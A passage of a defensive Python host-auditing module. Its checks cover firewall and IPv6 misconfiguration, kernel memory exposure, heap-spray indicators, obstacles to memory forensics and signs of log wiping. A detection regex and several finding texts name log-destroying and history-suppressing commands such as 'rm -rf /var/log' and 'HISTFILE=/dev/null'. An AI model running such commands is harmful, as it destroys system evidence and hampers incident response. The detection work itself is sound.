    ignore_all = _read_proc("/proc/sys/net/ipv4/icmp_echo_ignore_all")
    ignore_bc = _read_proc("/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts")
    if ignore_all == "0" and ignore_bc == "0":
        findings.append({
            "severity": "MEDIUM",
            "title": "BROADCAST_PING_ENABLED",
            "detail": (
                "/proc/sys/net/ipv4/icmp_echo_ignore_all=0 and "
                "icmp_echo_ignore_broadcasts=0 — host responds to broadcast ICMP "
                "echo requests; enables smurf-style amplification attacks where "
                "spoofed pings to a broadcast address flood a victim with replies"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def check_ipv6_misconfiguration() -> list:
    """IPv6 security misconfiguration detection via /proc/sys/net/ipv6."""
    findings = []

    def _read_proc(path):
        try:
            with open(path, "r") as fh:
                return fh.read().strip()
        except (PermissionError, FileNotFoundError, OSError):
            return None

    # Router Advertisement acceptance — rogue RA attacks
    val = _read_proc("/proc/sys/net/ipv6/conf/all/accept_ra")
    if val == "1":
        findings.append({
            "severity": "HIGH",
            "title": "IPV6_RA_ACCEPTED",
            "detail": (
                "/proc/sys/net/ipv6/conf/all/accept_ra=1 — "
                "host accepts IPv6 Router Advertisement messages; "
                "an attacker on the local segment can send rogue RAs to "
                "redirect traffic through a controlled IPv6 gateway or "
                "overwrite default route entries"
            ),
            "host": "localhost",
            "port": 0,
        })

    # IPv6 ICMP redirects
    val = _read_proc("/proc/sys/net/ipv6/conf/all/accept_redirects")
    if val == "1":
        findings.append({
            "severity": "HIGH",
            "title": "IPV6_REDIRECTS_ENABLED",
            "detail": (
                "/proc/sys/net/ipv6/conf/all/accept_redirects=1 — "
                "host accepts ICMPv6 redirect messages that alter its routing table; "
                "local attacker can redirect IPv6 traffic through a controlled node"
            ),
            "host": "localhost",
            "port": 0,
        })

    # IPv6 enabled but no ip6tables rules
    ipv6_disabled = _read_proc("/proc/sys/net/ipv6/conf/all/disable_ipv6")
    if ipv6_disabled == "0":
        # IPv6 is active — check for ip6tables ruleset
        ip6tables_empty = True
        try:
            result = subprocess.run(
                ["ip6tables-save"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
            )
            output = result.stdout.decode("utf-8", errors="replace")
            # ip6tables-save outputs at minimum chain headers; empty = no user rules
            rule_lines = [
                l for l in output.splitlines()
                if l.strip() and not l.startswith("#") and not l.startswith(":")
                and l not in ("*filter", "COMMIT")
            ]
            if rule_lines:
                ip6tables_empty = False
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            pass

        if ip6tables_empty:
            findings.append({
                "severity": "MEDIUM",
                "title": "IPV6_UNFILTERED",
                "detail": (
                    "/proc/sys/net/ipv6/conf/all/disable_ipv6=0 (IPv6 active) and "
                    "ip6tables ruleset is empty — IPv6 traffic is unfiltered; "
                    "services bound to IPv6 addresses may be reachable without "
                    "firewall controls that are only applied to IPv4"
                ),
                "host": "localhost",
                "port": 0,
            })

    # IPv6 privacy addresses (temporary addresses)
    val = _read_proc("/proc/sys/net/ipv6/conf/all/use_tempaddr")
    if val == "0":
        findings.append({
            "severity": "MEDIUM",
            "title": "IPV6_NO_PRIVACY_ADDRESSES",
            "detail": (
                "/proc/sys/net/ipv6/conf/all/use_tempaddr=0 — "
                "IPv6 privacy extensions (RFC 4941) are disabled; host uses a "
                "stable EUI-64 address derived from its MAC address, enabling "
                "long-term tracking and correlation of connections across networks"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def check_firewall_rules() -> list:
    """Linux firewall misconfiguration detection via iptables, nftables, and ufw."""
    findings = []

    # --- iptables ---
    iptables_available = False
    iptables_empty = True
    input_accept_all = False
    try:
        result = subprocess.run(
            ["iptables", "-L", "-n"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10,
        )
        output = result.stdout.decode("utf-8", errors="replace")
        if result.returncode == 0:
            iptables_available = True
            lines = output.splitlines()
            # Detect empty ruleset: only default chain headers with no rules
            rule_lines = [
                l for l in lines
                if l.strip() and not l.startswith("Chain") and not l.startswith("target")
                and not l.startswith("num") and l.strip() != ""
            ]
            if rule_lines:
                iptables_empty = False

            # Check INPUT chain default policy
            for line in lines:
                if line.startswith("Chain INPUT") and "policy ACCEPT" in line:
                    input_accept_all = True
                    break
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    if iptables_available:
        if iptables_empty:
            findings.append({
                "severity": "CRITICAL",
                "title": "NO_IPTABLES_RULES",
                "detail": (
                    "iptables -L -n shows no rules in any chain — "
                    "host has no firewall rules; all inbound and outbound traffic "
                    "is permitted; any listening service is reachable without restriction"
                ),
                "host": "localhost",
                "port": 0,
            })
        elif input_accept_all:
            findings.append({
                "severity": "HIGH",
                "title": "IPTABLES_INPUT_ACCEPT_ALL",
                "detail": (
                    "iptables INPUT chain default policy is ACCEPT — "
                    "packets not matched by any rule are accepted; "
                    "a missed rule or rule ordering error exposes all unmatched services; "
                    "DROP or REJECT policy should be the default"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- nftables ---
    try:
        result = subprocess.run(
            ["nft", "list", "ruleset"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10,
        )
        if result.returncode == 0:
            output = result.stdout.decode("utf-8", errors="replace").strip()
            # Empty ruleset = no tables defined at all
            if not output:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NO_NFTABLES_RULES",
                    "detail": (
                        "nft list ruleset returned empty output — "
                        "nftables has no tables or chains configured; "
                        "if nftables is the intended firewall backend, "
                        "no traffic filtering is active"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    # --- ufw ---
    try:
        result = subprocess.run(
            ["ufw", "status"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10,
        )
        if result.returncode == 0:
            output = result.stdout.decode("utf-8", errors="replace").lower()
            if "inactive" in output:
                findings.append({
                    "severity": "HIGH",
                    "title": "UFW_INACTIVE",
                    "detail": (
                        "'ufw status' reports inactive — "
                        "Uncomplicated Firewall is installed but not enabled; "
                        "no ufw rules are enforced; system relies on iptables/nftables "
                        "being configured independently or is unprotected"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    # --- conntrack table size ---
    ct_max_path = "/proc/sys/net/netfilter/nf_conntrack_max"
    try:
        with open(ct_max_path, "r") as fh:
            ct_max = int(fh.read().strip())
        if ct_max < 1000:
            findings.append({
                "severity": "MEDIUM",
                "title": "LOW_CONNTRACK_MAX",
                "detail": (
                    f"/proc/sys/net/netfilter/nf_conntrack_max={ct_max} — "
                    "connection tracking table maximum is very low; "
                    "an attacker generating moderate connection volume can exhaust "
                    "the conntrack table, causing the firewall to drop new connections "
                    "and resulting in denial of service for all tracked protocols"
                ),
                "host": "localhost",
                "port": 0,
            })
    except (PermissionError, FileNotFoundError, OSError, ValueError):
        pass

    return findings


def check_network_interface_exposure() -> list:
    """Network interface security checks via /proc/net and ip route."""
    findings = []

    # --- Multiple global unicast IPv6 prefixes ---
    try:
        with open("/proc/net/if_inet6", "r") as fh:
            lines = fh.readlines()
        # Format: addr iface_idx prefix_len scope flags ifname
        # scope 00 = global unicast
        global_prefixes = set()
        for line in lines:
            parts = line.split()
            if len(parts) < 6:
                continue
            addr_hex = parts[0]
            scope = parts[3]
            if scope == "00" and len(addr_hex) == 32:
                # Extract /48 prefix for grouping (first 12 hex chars)
                prefix = addr_hex[:12]
                first_nibble = int(addr_hex[0], 16)
                # Global unicast: 2xxx or 3xxx (first nibble 2 or 3)
                if first_nibble in (2, 3):
                    global_prefixes.add(prefix)
        if len(global_prefixes) > 1:
            findings.append({
                "severity": "MEDIUM",
                "title": "MULTIPLE_GLOBAL_IPV6_PREFIXES",
                "detail": (
                    f"/proc/net/if_inet6 shows {len(global_prefixes)} distinct global "
                    f"unicast /48 prefixes — host has addresses from multiple IPv6 "
                    "provider blocks; unexpected on single-homed hosts; "
                    "may indicate misconfigured RA acceptance or undisclosed multihoming"
                ),
                "host": "localhost",
                "port": 0,
            })
    except (PermissionError, FileNotFoundError, OSError):
        pass

    # --- ARP cache incomplete entries ---
    try:
        with open("/proc/net/arp", "r") as fh:
            lines = fh.readlines()
        # Header: IP address, HW type, Flags, HW address, Mask, Device
        # HW type 0x0 in the Flags column = 0x0 = incomplete (no reply received)
        incomplete = 0
        for line in lines[1:]:  # skip header
            parts = line.split()
            if len(parts) < 4:
                continue
            flags = parts[2]
            hw_addr = parts[3]
            # Incomplete entries have HW address 00:00:00:00:00:00
            if hw_addr == "00:00:00:00:00:00":
                incomplete += 1
        if incomplete > 10:
            findings.append({
                "severity": "MEDIUM",
                "title": "ARP_CACHE_INCOMPLETE_ENTRIES",
                "detail": (
                    f"/proc/net/arp shows {incomplete} incomplete ARP entries "
                    "(HW address 00:00:00:00:00:00) — high count of unresolved ARP "
                    "requests may indicate ARP poisoning, a scanning host consuming "
                    "ARP table capacity, or a network misconfiguration"
                ),
                "host": "localhost",
                "port": 0,
            })
    except (PermissionError, FileNotFoundError, OSError):
        pass

    # --- Multiple default routes ---
    try:
        result = subprocess.run(
            ["ip", "route"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5,
        )
        if result.returncode == 0:
            output = result.stdout.decode("utf-8", errors="replace")
            default_routes = [
                l for l in output.splitlines()
                if l.strip().startswith("default via")
            ]
            if len(default_routes) > 1:
                routes_str = "; ".join(default_routes[:5])
                findings.append({
                    "severity": "MEDIUM",
                    "title": "MULTIPLE_DEFAULT_ROUTES",
                    "detail": (
                        f"ip route shows {len(default_routes)} default gateway entries: "
                        f"{routes_str} — asymmetric routing can cause connection tracking "
                        "failures, firewall rule bypass (packets enter on one interface, "
                        "leave on another), and inconsistent NAT behavior"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    # --- Interface TX errors ---
    try:
        with open("/proc/net/dev", "r") as fh:
            lines = fh.readlines()
        # Format (after two header lines):
        # iface: rx_bytes rx_packets rx_errs rx_drop ... tx_bytes tx_packets tx_errs ...
        for line in lines[2:]:
            line = line.strip()
            if ":" not in line:
                continue
            iface, stats = line.split(":", 1)
            iface = iface.strip()
            parts = stats.split()
            if len(parts) < 16:
                continue
            try:
                # tx_errs is at index 10 (0-based) in the 16-field layout
                tx_errs = int(parts[10])
            except (ValueError, IndexError):
                continue
            if tx_errs > 100:
                findings.append({
                    "severity": "LOW",
                    "title": "INTERFACE_TX_ERRORS",
                    "detail": (
                        f"Interface '{iface}' has {tx_errs} TX errors "
                        "(/proc/net/dev) — persistent transmit errors may indicate "
                        "link-layer attacks (e.g., 802.1Q DoS, switchport misbehavior), "
                        "hardware degradation, or active network interference"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
    except (PermissionError, FileNotFoundError, OSError):
        pass

    return findings


def check_proc_kcore_access() -> list:
    """Check kernel memory exposure via /proc/kcore, kallsyms, System.map, and /proc/kmem."""
    findings = []

    # /proc/kcore — full kernel address space as ELF core dump
    if os.access("/proc/kcore", os.R_OK):
        try:
            size = os.path.getsize("/proc/kcore")
        except OSError:
            size = 0
        findings.append({
            "severity": "CRITICAL",
            "title": "KCORE_READABLE",
            "detail": (
                f"/proc/kcore is readable (size {size} bytes) — exposes the full kernel "
                "virtual address space as an ELF core dump; an unprivileged reader can "
                "extract kernel data structures, credentials cached in kernel memory, "
                "and bypass KASLR by resolving live kernel symbol addresses"
            ),
            "host": "localhost",
            "port": 0,
        })

    # /proc/kallsyms — kernel symbol table; KASLR bypass if addresses non-zero
    if os.access("/proc/kallsyms", os.R_OK):
        try:
            with open("/proc/kallsyms", "r") as fh:
                first_line = fh.readline().strip()
            addr_nonzero = not first_line.startswith("0000000000000000")
        except OSError:
            addr_nonzero = False
        addr_note = (
            "addresses are non-zero (KASLR ineffective for this reader)"
            if addr_nonzero
            else "addresses are zeroed for non-root (kptr_restrict active)"
        )
        findings.append({
            "severity": "HIGH",
            "title": "KALLSYMS_READABLE",
            "detail": (
                f"/proc/kallsyms is readable; {addr_note} — kernel symbol table "
                "exposes function/variable addresses used to construct ROP chains and "
                "target kernel exploit payloads; non-zero addresses defeat KASLR "
                "(kptr_restrict=0)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # /boot/System.map — static kernel symbol map; always gives layout even with KASLR
    for smap in ["/boot/System.map", f"/boot/System.map-{os.uname().release}"]:
        if os.path.exists(smap) and os.access(smap, os.R_OK):
            findings.append({
                "severity": "HIGH",
                "title": "SYSTEM_MAP_READABLE",
                "detail": (
                    f"{smap} is readable — static kernel symbol map reveals the "
                    "compiled-in address layout of the running kernel; combined with "
                    "a kernel info-leak this gives an attacker a complete symbol "
                    "resolution primitive without touching /proc/kallsyms"
                ),
                "host": "localhost",
                "port": 0,
            })
            break  # report once

    # /proc/kmem — direct kernel memory device; write access = arbitrary kernel write
    if os.path.exists("/proc/kmem"):
        findings.append({
            "severity": "CRITICAL",
            "title": "KMEM_ACCESSIBLE",
            "detail": (
                "/proc/kmem exists — direct kernel memory character device; "
                "read access enables arbitrary kernel memory inspection; write access "
                "enables arbitrary kernel memory modification (privilege escalation "
                "to root by overwriting cred structures or modifying kernel text)"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def check_heap_injection_surface(pid=None) -> list:
    """Scan /proc/{pid}/maps for anonymous RWX mappings, heap spray indicators,
    and /proc/{pid}/mem accessibility. If pid is None, scan all numeric /proc dirs."""
    findings = []

    def _get_pids():
        pids = []
        try:
            for entry in os.listdir("/proc"):
                if entry.isdigit():
                    pids.append(int(entry))
        except (PermissionError, OSError):
            pass
        return pids

    target_pids = [pid] if pid is not None else _get_pids()

    # Track across all pids to avoid duplicate titles flooding the report
    reported_rwx = False
    reported_heap = False
    reported_spray = False
    reported_mem = False

    for p in target_pids:
        maps_path = f"/proc/{p}/maps"
        try:
            with open(maps_path, "r") as fh:
                map_lines = fh.readlines()
        except (PermissionError, FileNotFoundError, OSError):
            continue

        heap_total = 0
        anon_sizes = {}  # size -> count (for spray detection)

        for line in map_lines:
            line = line.strip()
            if not line:
                continue
            # Format: addr_start-addr_end perms offset dev inode [pathname]
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range = parts[0]
            perms = parts[1]  # e.g. rwxp
            pathname = parts[5] if len(parts) >= 6 else ""

            # Parse address range for size
            try:
                start_s, end_s = addr_range.split("-")
                start_addr = int(start_s, 16)
                end_addr = int(end_s, 16)
                seg_size = end_addr - start_addr
            except (ValueError, IndexError):
                continue

            is_anon = pathname == "" or pathname.startswith("[anon")
            is_heap = pathname == "[heap]"

            # Anonymous RWX mapping — shellcode injection vector
            if not reported_rwx and is_anon and "r" in perms and "w" in perms and "x" in perms:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "ANONYMOUS_RWX_MAPPING",
                    "detail": (
                        f"pid {p} has an anonymous rwx mapping at {addr_range} "
                        f"(size {seg_size:#x} bytes, perms={perms}) — non-file-backed "
                        "executable+writable region; shellcode can be written and "
                        "jumped to without a file-backed executable; indicates "
                        "JIT engine misconfiguration, dynamic code generation, or "
                        "active shellcode staging"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
                reported_rwx = True

            # Heap size accumulation
            if is_heap:
                heap_total += seg_size

            # Anonymous mapping size tracking for spray detection
            if is_anon and seg_size > 0:
                anon_sizes[seg_size] = anon_sizes.get(seg_size, 0) + 1

        # Oversized heap check (> 1 GB)
        if not reported_heap and heap_total > 1 * 1024 * 1024 * 1024:
            findings.append({
                "severity": "MEDIUM",
                "title": "OVERSIZED_HEAP",
                "detail": (
                    f"pid {p} [heap] totals {heap_total // (1024*1024)} MB — "
                    "heap exceeding 1 GB may indicate a heap spray attempt, "
                    "memory leak enabling use-after-free exploitation, or "
                    "deliberate memory grooming for kernel object placement attacks"
                ),
                "host": "localhost",
                "port": 0,
            })
            reported_heap = True

        # Heap spray: multiple anonymous segments of identical size (>=3 occurrences)
        if not reported_spray:
            for seg_size, count in anon_sizes.items():
                if count >= 3 and seg_size >= 0x1000:
                    findings.append({
                        "severity": "HIGH",
                        "title": "HEAP_SPRAY_INDICATORS",
                        "detail": (
                            f"pid {p} has {count} anonymous mappings of identical size "
                            f"{seg_size:#x} bytes — repeated same-size anonymous segments "
                            "are a characteristic heap spray signature; used to increase "
                            "reliability of use-after-free and type confusion exploits by "
                            "controlling heap layout before triggering the vulnerability"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
                    reported_spray = True
                    break

        # /proc/{pid}/mem readability — process memory directly accessible
        if not reported_mem:
            mem_path = f"/proc/{p}/mem"
            if os.access(mem_path, os.R_OK):
                findings.append({
                    "severity": "HIGH",
                    "title": "PROC_MEM_ACCESSIBLE",
                    "detail": (
                        f"/proc/{p}/mem is readable — direct process memory access "
                        "without ptrace; an attacker can read secrets (keys, tokens, "
                        "passwords) from process address space and inject shellcode "
                        "into writable mappings by seeking to target addresses; "
                        "also usable for ptrace-bypass credential extraction "
                        "(e.g., extracting cleartext from OpenSSL buffers)"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
                reported_mem = True

    return findings


def detect_memory_forensic_evasion() -> list:
    """Detect conditions that impair memory forensics (Volatility-style acquisition).

    Sourced from Violent Python ch.7 — forensic investigation: Volatility analysis,
    Mac OS X forensics, recovering deleted files from memory dumps. Checks whether
    the live system presents obstacles that would prevent or degrade a Volatility
    memory image acquisition and analysis workflow.
    """
    import re as _re
    import stat as _stat
    import glob as _glob

    findings = []

    # /proc/kcore — kernel memory pseudo-file used by Volatility for live acquisition
    kcore_path = "/proc/kcore"
    try:
        kcore_st = os.stat(kcore_path)
        if kcore_st.st_size == 0:
            findings.append({
                "severity": "MEDIUM",
                "title": "KCORE_HARDENED",
                "detail": (
                    "/proc/kcore exists but reports size 0 — kernel memory exposed "
                    "via /proc/kcore has been restricted (kernel.kptr_restrict or "
                    "CONFIG_STRICT_DEVMEM); Volatility live-acquisition from this "
                    "host is limited; memory forensics cannot image kernel structures "
                    "directly, forcing an analyst to rely on crash dump artifacts "
                    "instead of live kernel object walks"
                ),
                "host": "localhost",
                "port": 0,
            })
    except PermissionError:
        findings.append({
            "severity": "MEDIUM",
            "title": "KCORE_HARDENED",
            "detail": (
                "/proc/kcore is present but read-denied — DAC or LSM policy blocks "
                "direct kernel memory access; Volatility live-acquisition from this "
                "host is limited; consistent with a hardened kernel "
                "(CONFIG_STRICT_DEVMEM, kernel.kptr_restrict=2, or SELinux/AppArmor "
                "policy); memory forensics must fall back to crash dump image if "
                "one exists"
            ),
            "host": "localhost",
            "port": 0,
        })
    except FileNotFoundError:
        pass

    # /proc/kmem — alternate live kernel memory interface (older kernels)
    kmem_path = "/proc/kmem"
    if not os.path.exists(kmem_path):
        findings.append({
            "severity": "MEDIUM",
            "title": "KMEM_NOT_ACCESSIBLE",
            "detail": (
                "/proc/kmem is absent on this system — the direct kernel memory "
                "character device is unavailable; tools that rely on /proc/kmem for "
                "low-level kernel memory reads (including some Volatility plugins "
                "and early Linux memory acquisition approaches) cannot operate; "
                "presence of this path on older kernels enabled raw kernel memory "
                "reads without /dev/mem restrictions"
            ),
            "host": "localhost",
            "port": 0,
        })
    elif not os.access(kmem_path, os.R_OK):
        findings.append({
            "severity": "MEDIUM",
            "title": "KMEM_NOT_ACCESSIBLE",
            "detail": (
                "/proc/kmem exists but is not readable — DAC or LSM restriction "
                "blocks kernel memory reads via this path; memory forensics tools "
                "depending on /proc/kmem for kernel structure extraction will fail "
                "without elevated privilege or an alternative acquisition path"
            ),
            "host": "localhost",
            "port": 0,
        })

    # /dev/mem — physical memory character device; primary Volatility acquisition source
    devmem_path = "/dev/mem"
    try:
        devmem_st = os.stat(devmem_path)
        mode = devmem_st.st_mode & 0o777
        if mode == 0o000:
            findings.append({
                "severity": "MEDIUM",
                "title": "DEVMEM_HARDENED",
                "detail": (
                    "/dev/mem has permissions 0000 — physical memory access is fully "
                    "blocked at the DAC layer; Volatility physical memory acquisition "
                    "via /dev/mem is not possible; this is a deliberate hardening "
                    "measure (CONFIG_STRICT_DEVMEM) that prevents both forensic "
                    "acquisition and attacker direct-physical-memory attacks such as "
                    "DMA-based credential extraction"
                ),
                "host": "localhost",
                "port": 0,
            })
    except FileNotFoundError:
        findings.append({
            "severity": "MEDIUM",
            "title": "DEVMEM_HARDENED",
            "detail": (
                "/dev/mem is absent — physical memory character device has been "
                "removed or the kernel was compiled without CONFIG_DEVMEM; "
                "Volatility physical memory acquisition via /dev/mem is unavailable; "
                "memory forensics on this host requires an LKM-based acquisition "
                "module (e.g., LiME) or a crash dump if one exists"
            ),
            "host": "localhost",
            "port": 0,
        })
    except PermissionError:
        pass

    # /dev/shm — shared memory filesystem; used by in-memory malware to stage executables
    devshm_dir = "/dev/shm"
    suspicious_extensions = (".sh", ".py", ".elf", ".bin")
    if os.path.isdir(devshm_dir):
        try:
            for entry in os.listdir(devshm_dir):
                entry_path = os.path.join(devshm_dir, entry)
                lower = entry.lower()
                if any(lower.endswith(ext) for ext in suspicious_extensions):
                    try:
                        st = os.stat(entry_path)
                        if st.st_mode & (_stat.S_IXUSR | _stat.S_IXGRP | _stat.S_IXOTH):
                            findings.append({
                                "severity": "HIGH",
                                "title": "EXECUTABLE_IN_SHM",
                                "detail": (
                                    f"/dev/shm/{entry} has executable bit set — "
                                    "in-memory malware indicator; /dev/shm is a "
                                    "tmpfs mount that survives in RAM and never "
                                    "touches disk; dropping executable payloads "
                                    "here is a standard fileless-malware staging "
                                    "technique used to evade disk-based forensics "
                                    "and AV scanning; Volatility memory acquisition "
                                    "is required to recover this artifact post-reboot"
                                ),
                                "host": "localhost",
                                "port": 0,
                            })
                    except (PermissionError, FileNotFoundError):
                        pass
        except PermissionError:
            pass

    # Crash dumps / core files — Volatility-compatible memory image sources
    crash_patterns = ["/var/crash/*.dump", "/var/core/*.core", "/var/crash/*.vmem"]
    for pattern in crash_patterns:
        matches = _glob.glob(pattern)
        for match in matches:
            findings.append({
                "severity": "MEDIUM",
                "title": "CRASH_DUMP_PRESENT",
                "detail": (
                    f"{match} — a crash dump or core file is present; these files "
                    "may contain a full or partial memory image amenable to Volatility "
                    "analysis; forensic artifacts include kernel symbols, process "
                    "trees, network connections, encryption keys, and plaintext "
                    "credentials from heap regions; on attacker-controlled systems "
                    "this dump may also contain injected shellcode or in-memory "
                    "implant artifacts recoverable via Volatility malfind / cmdline "
                    "plugins"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


def check_log_deletion_patterns() -> list:
    """Detect evidence of log wiping consistent with Metasploit post-exploitation.

    Sourced from Violent Python ch.7 — Metasploit log wiping; post-exploitation
    anti-forensics. Checks for zeroed log files, stale log directories, cleared
    login history, deletion commands in shell history, and aggressive log rotation
    configured with secure-deletion tools.
    """
    import re as _re
    import time as _time

    findings = []
    now = _time.time()
    stale_threshold = 86400  # 24 hours in seconds

    # /var/log directory — check for empty directory or stale mtime
    varlog = "/var/log"
    if os.path.isdir(varlog):
        try:
            entries = [e for e in os.listdir(varlog)
                       if not e.startswith(".")]
            if len(entries) == 0:
                findings.append({
                    "severity": "HIGH",
                    "title": "LOG_DIRECTORY_STALE",
                    "detail": (
                        "/var/log is completely empty — all log files have been "
                        "removed; this is a strong indicator of deliberate log "
                        "wiping consistent with Metasploit post-exploitation "
                        "clearev or manual rm -rf /var/log/*; an empty log "
                        "directory destroys forensic timeline reconstruction and "
                        "prevents incident response from establishing attacker "
                        "dwell time, lateral movement paths, and command history"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
            else:
                varlog_st = os.stat(varlog)
                age_seconds = now - varlog_st.st_mtime
                if age_seconds > stale_threshold:
                    findings.append({
                        "severity": "HIGH",
                        "title": "LOG_DIRECTORY_STALE",
                        "detail": (
                            f"/var/log last modified {int(age_seconds / 3600)} hours "
                            "ago — log directory mtime has not advanced in over 24 "
                            "hours despite a running system; this is consistent with "
                            "log forwarding being disabled after an intrusion, "
                            "rsyslog/journald service termination, or bind-mount "
                            "shadowing of /var/log to suppress new log writes; "
                            "verify syslog daemon is running and /var/log is the "
                            "real filesystem mount, not an attacker overlay"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
        except PermissionError:
            pass

    # syslog / messages — canonical system event logs; size 0 = zeroed
    for log_path in ("/var/log/syslog", "/var/log/messages"):
        try:
            st = os.stat(log_path)
            if st.st_size == 0:
                findings.append({
                    "severity": "HIGH",
                    "title": "SYSLOG_ZEROED",
                    "detail": (
                        f"{log_path} exists but has zero bytes — the primary system "
                        "log has been truncated; active log wiping technique: "
                        "> /var/log/syslog or truncate -s 0 /var/log/syslog "
                        "zeroes the file while preserving the inode so rsyslog "
                        "continues writing to an empty file without triggering "
                        "alerts; Metasploit clearev automates this across multiple "
                        "log targets on a compromised host; forensic timeline "
                        "reconstruction is impossible for events prior to the wipe"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
        except (FileNotFoundError, PermissionError):
            pass

    # wtmp / btmp — binary login history; zeroing clears all login records
    for log_path, label in (
        ("/var/log/wtmp", "WTMP_ZEROED"),
        ("/var/log/btmp", "BTMP_ZEROED"),
    ):
        try:
            st = os.stat(log_path)
            if st.st_size == 0:
                findings.append({
                    "severity": "HIGH",
                    "title": label,
                    "detail": (
                        f"{log_path} has zero bytes — login history file has been "
                        "cleared; wtmp records all logins/logouts/reboots (read by "
                        "last); btmp records failed login attempts (read by lastb); "
                        "zeroing these files is a standard post-exploitation step "
                        "that destroys evidence of attacker login sessions, lateral "
                        "movement timestamps, and authentication brute-force activity; "
                        "consistent with Metasploit post/multi/manage/shell_to_meterpreter "
                        "followed by clearev or manual wipe via truncate"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
        except (FileNotFoundError, PermissionError):
            pass

    # .bash_history — check for log-deletion commands recorded in shell history
    log_deletion_pattern = _re.compile(
        r"(rm\s+-rf\s+/var/log"
        r"|truncate\s+-s\s+0\s+/var/log"
        r"|>\s*/var/log"
        r"|shred\s+.*?/var/log"
        r"|>\s*/dev/null\s*#?\s*log"
        r"|echo\s+['\"]?\s*['\"]?\s*>\s*/var/log"
        r"|unset\s+HISTFILE"
        r"|HISTFILE=/dev/null)"
    )
    history_candidates = []
    # Check all user home directories
    try:
        for entry in os.listdir("/home"):
            candidate = f"/home/{entry}/.bash_history"
            history_candidates.append(candidate)
    except (PermissionError, FileNotFoundError):
        pass
    history_candidates.append("/root/.bash_history")

    for hist_path in history_candidates:
        try:
            with open(hist_path, "r", errors="replace") as fh:
                for lineno, line in enumerate(fh, 1):
                    if log_deletion_pattern.search(line):
                        findings.append({
                            "severity": "HIGH",
                            "title": "LOG_DELETION_COMMANDS_IN_HISTORY",
                            "detail": (
                                f"{hist_path}:{lineno} — log deletion command "
                                f"detected: {line.strip()!r}; bash history contains "
                                "explicit log wiping or history-suppression commands; "
                                "this is direct evidence of anti-forensics activity "
                                "consistent with post-exploitation cleanup; command "
                                "may reflect attacker activity or an authorized "
                                "administrator action — cross-reference with "
                                "incident timeline and change management records"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                        break  # one finding per history file
        except (FileNotFoundError, PermissionError, IsADirectoryError):
            pass

    # logrotate.d — check for shred or secure_deletion options that destroy log content
    logrotate_dir = "/etc/logrotate.d"
    secure_rotate_pattern = _re.compile(
        r"\bshred\b|\bsecure_deletion\b|\bshredcycle\b"
    )
    if os.path.isdir(logrotate_dir):
        try:
            for entry in os.listdir(logrotate_dir):
                conf_path = os.path.join(logrotate_dir, entry)
                if not os.path.isfile(conf_path):
                    continue
                try:
                    with open(conf_path, "r", errors="replace") as fh:
                        content = fh.read()
                    if secure_rotate_pattern.search(content):
                        findings.append({
                            "severity": "MEDIUM",
                            "title": "SECURE_LOG_ROTATION_CONFIGURED",
                            "detail": (
                                f"{conf_path} contains shred or secure_deletion "
                                "directive — logrotate is configured to overwrite "
                                "log file contents before deletion rather than "
                                "simply unlinking the inode; while this may be an "
                                "authorized privacy or compliance configuration, "
                                "it also means rotated logs are forensically "
                                "unrecoverable; an attacker who modifies logrotate "
                                "config post-compromise can use this to ensure "
                                "evidence destruction on the next rotation cycle "
                                "without touching log files directly"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except (PermissionError, IsADirectoryError):
                    pass
        except PermissionError:
            pass

    return findings


def detect_token_manipulation(binary_data: bytes) -> list:
    """Detect Windows access token manipulation patterns in binary data.

    Synthesized from: Practical Malware Analysis Ch.11 (SeDebugPrivilege,
    AdjustTokenPrivileges, privilege escalation) and Ch.12 (token theft via
    DuplicateTokenEx/CreateProcessWithTokenW process injection chain).

    Args:
        binary_data: Raw bytes of a PE binary or memory dump.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings = []

    # --- CRITICAL: OpenProcessToken + AdjustTokenPrivileges ---
    # PMA Ch.11: canonical sequence for enabling SeDebugPrivilege; opens the
    # process token then adjusts privilege flags to SE_PRIVILEGE_ENABLED.
    if b"OpenProcessToken" in binary_data and b"AdjustTokenPrivileges" in binary_data:
        findings.append({
            "severity": "CRITICAL",
            "title": "TOKEN_PRIVILEGE_ESCALATION",
            "detail": (
                "Binary imports OpenProcessToken and AdjustTokenPrivileges — "
                "canonical Windows privilege escalation sequence; malware opens "
                "the current process token and adjusts privilege flags to grant "
                "itself elevated rights (most commonly SeDebugPrivilege); this "
                "pattern documented in PMA Ch.11 precedes system-process injection "
                "and allows the binary to bypass process-level security descriptors; "
                "impersonation or privilege adjustment confirmed by import pairing"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- CRITICAL: ImpersonateLoggedOnUser or ImpersonateNamedPipeClient ---
    # Token relay / potato-style escalation; assumes the security context of
